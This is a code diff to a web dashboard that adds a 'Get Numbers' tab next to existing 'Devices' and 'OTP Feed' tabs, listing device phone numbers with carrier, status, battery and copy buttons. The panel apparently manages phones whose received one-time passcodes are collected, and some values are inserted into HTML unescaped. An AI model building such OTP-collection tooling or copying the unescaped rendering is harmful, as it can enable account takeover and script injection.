@@ -14,6 +14,16 @@
     .dev-head strong{font-size:.8125rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
     .dev-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:.25rem .5rem;font-size:.6875rem;color:var(--text-muted)}
     .dev-grid .val{color:var(--text);font-weight:600;margin-top:1px}
+    .num-card{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);padding:.625rem .75rem;margin-bottom:.375rem;display:flex;align-items:center;gap:.625rem;flex-wrap:wrap}
+    .num-main{flex:1;min-width:0}
+    .num-phone{font-family:'JetBrains Mono',monospace;font-size:1rem;font-weight:700;color:var(--accent);letter-spacing:.03em}
+    .num-meta{font-size:.6875rem;color:var(--text-muted);margin-top:2px;display:flex;gap:.5rem;flex-wrap:wrap;align-items:center}
+    .num-actions{display:flex;gap:.25rem;flex-shrink:0}
+    .copy-btn{background:var(--accent-subtle);color:var(--accent);border:1px solid rgba(6,182,212,.15);border-radius:var(--radius);padding:.25rem .5rem;font-size:.625rem;font-weight:600;cursor:pointer;font-family:inherit;transition:all .15s}
+    .copy-btn:hover{background:rgba(6,182,212,.15)}
+    .copy-btn.copied{background:var(--green-subtle);color:var(--green);border-color:rgba(34,197,94,.15)}
+    .search-box{width:100%;padding:.5rem .75rem;background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);color:var(--text);font-size:.8125rem;font-family:inherit;margin-bottom:.75rem}
+    .search-box:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-subtle)}
     .otp-card{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);padding:.625rem .75rem;margin-bottom:.375rem;display:flex;align-items:flex-start;gap:.625rem;flex-wrap:wrap}
     .otp-code{font-family:'JetBrains Mono',monospace;font-size:1.125rem;font-weight:800;color:var(--accent);letter-spacing:.05em;flex-shrink:0}
     .otp-info{font-size:.6875rem;color:var(--text-muted);flex:1;min-width:0}
@@ -46,6 +56,7 @@
 
       <div class="tabs">
         <button class="tab active" data-tab="devices">Devices</button>
+        <button class="tab" data-tab="numbers">Get Numbers</button>
         <button class="tab" data-tab="otps">OTP Feed</button>
       </div>
 
@@ -53,6 +64,15 @@
         <div class="card">
           <div class="card-header"><div><div class="card-title">All Devices</div><div class="card-subtitle" id="devCount">Loading...</div></div><button class="btn btn-secondary btn-sm" onclick="loadDashboard()">Refresh</button></div>
           <div id="deviceList"><div class="empty-state"><div class="spinner" style="margin:0 auto 1rem"></div><p>Loading devices...</p></div></div>
+        </div>
+      </div>
+
+      <!-- Get Numbers -->
+      <div id="tab-numbers" class="tab-content" style="display:none">
+        <div class="card">
+          <div class="card-header"><div><div class="card-title">Available Numbers</div><div class="card-subtitle" id="numCount">Loading...</div></div><button class="btn btn-secondary btn-sm" onclick="loadDashboard()">Refresh</button></div>
+          <input class="search-box" id="numSearch" placeholder="Search by number, country, carrier..." oninput="filterNumbers()">
+          <div id="numberList"><div class="empty-state"><div class="spinner" style="margin:0 auto 1rem"></div><p>Loading numbers...</p></div></div>
         </div>
       </div>
 
@@ -78,6 +98,7 @@
 
   <script>
     let currentUser = null;
+    let allNumbers = [];
 
     async function init() {
       const res = await fetch("/api/auth/me", { credentials: "include" });
@@ -108,6 +129,7 @@
       document.getElementById("subtitle").textContent = d.devices.online + " online / " + d.devices.total + " total · " + d.connections + " db(s)";
       document.getElementById("devCount").textContent = d.devices.total + " device(s)";
       renderDevices(d.devices.list);
+      renderNumbers(d.devices.list);
       renderOtps(d.otps.recent);
     }
 
@@ -129,6 +151,48 @@
         </div>`;
       }
       el.innerHTML = html;
+    }
+
+    function renderNumbers(devices) {
+      const numbers = devices.filter(d => d.phoneNumber && d.phoneNumber !== "—" && d.phoneNumber !== "Unknown");
+      allNumbers = numbers;
+      const el = document.getElementById("numberList");
+      document.getElementById("numCount").textContent = numbers.length + " number(s)";
+      if (!numbers.length) { el.innerHTML = '<div class="empty-state"><h3>No numbers</h3><p>No devices with phone numbers found.</p></div>'; return; }
+      let html = "";
+      for (const d of numbers) {
+        const badge = d.status ? '<span class="badge badge-green">Online</span>' : '<span class="badge badge-red">Offline</span>';
+        const masked = maskPhone(d.phoneNumber);
+        html += '<div class="num-card" data-search="' + (d.phoneNumber + ' ' + d.provider + ' ' + d.name + ' ' + masked).toLowerCase() + '">'
+          + '<div class="num-main"><div class="num-phone">' + masked + '</div>'
+          + '<div class="num-meta">' + badge + '<span>' + esc(d.provider || "—") + '</span><span>' + esc(d.name) + '</span>'
+          + (d.batteryPercent ? '<span>' + d.batteryPercent + '%</span>' : '') + '</div></div>'
+          + '<div class="num-actions">'
+          + '<button class="copy-btn" onclick="copyNum(this,\'' + esc(d.phoneNumber) + '\')">Copy Full</button>'
+          + '<button class="copy-btn" onclick="copyNum(this,\'' + masked + '\')">Copy Masked</button>'
+          + '</div></div>';
+      }
+      el.innerHTML = html;
+    }
+
+    function filterNumbers() {
+      const q = document.getElementById("numSearch").value.toLowerCase();
+      const cards = document.querySelectorAll("#numberList .num-card");
+      let shown = 0;
+      cards.forEach(card => {
+        const match = card.dataset.search.includes(q);
+        card.style.display = match ? "flex" : "none";
+        if (match) shown++;
+      });
+      document.getElementById("numCount").textContent = shown + " number(s)";
+    }
+
+    function copyNum(btn, text) {
+      navigator.clipboard.writeText(text).then(() => {
+        btn.classList.add("copied");
+        btn.textContent = "Copied!";
+        setTimeout(() => { btn.classList.remove("copied"); btn.textContent = text.includes("CYRUS") ? "Copy Masked" : "Copy Full"; }, 1500);
+      });
     }
 
     function maskPhone(phone) {
